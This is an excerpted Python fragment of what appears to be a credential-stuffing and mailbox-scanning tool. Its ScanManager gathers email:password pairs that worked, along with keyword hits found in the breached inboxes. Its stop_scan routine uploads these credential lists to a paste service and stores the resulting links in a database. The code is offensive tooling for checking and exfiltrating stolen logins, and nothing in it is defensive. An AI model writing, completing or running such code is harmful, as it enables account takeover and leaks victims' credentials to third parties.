...
class ScanManager:
    ...
    def get_upload_data(self):
        valid_lines = []
        for r in self.results_valid + self.results_inbox:
        ...
        for r in self.results_inbox:
            if r.get('keyword_hits'):
                for kw, count in r['keyword_hits'].items():
                    if kw not in keyword_lines:
                        keyword_lines[kw] = []
                    date = r.get(
                        'keyword_dates', {}
                    ).get(kw, 'N/A')
                    keyword_lines[kw].append(
                        f"{r['email']}:{r['password']} | "
                        f"{r.get('country', '?')} | "
                        f"{count} emails | Last: {date}"
                    )

        return valid_lines, keyword_lines
...
def stop_scan():
    ...
    for scan_id, scan in list(active_scans.items()):
        if scan.user_id == uid:
            ...
            valid_lines, kw_lines = scan.get_upload_data()
            ...
            for kw, lines in kw_lines.items():
                url = upload_to_paste(
                    '\n'.join(lines),
                    f"{kw} - Job {scan_id}"
                )
            ...
            jobs_col.update_one(
                {'_id': scan.job_id},
                {'$set': {
                    'upload_url_valid': upload_urls.get(
                        'valid', ''
                    ),
                    'upload_url_keywords': upload_urls
                }}
            )
...
if __name__ == '__main__':
    ...
    print(f"  Debug:    {DEBUG}")
    print(f"  Threads:  {MAX_SCAN_THREADS}")
    print(f"  Upload:   {MAX_UPLOAD_MB}MB max")
    print("═" * 45)
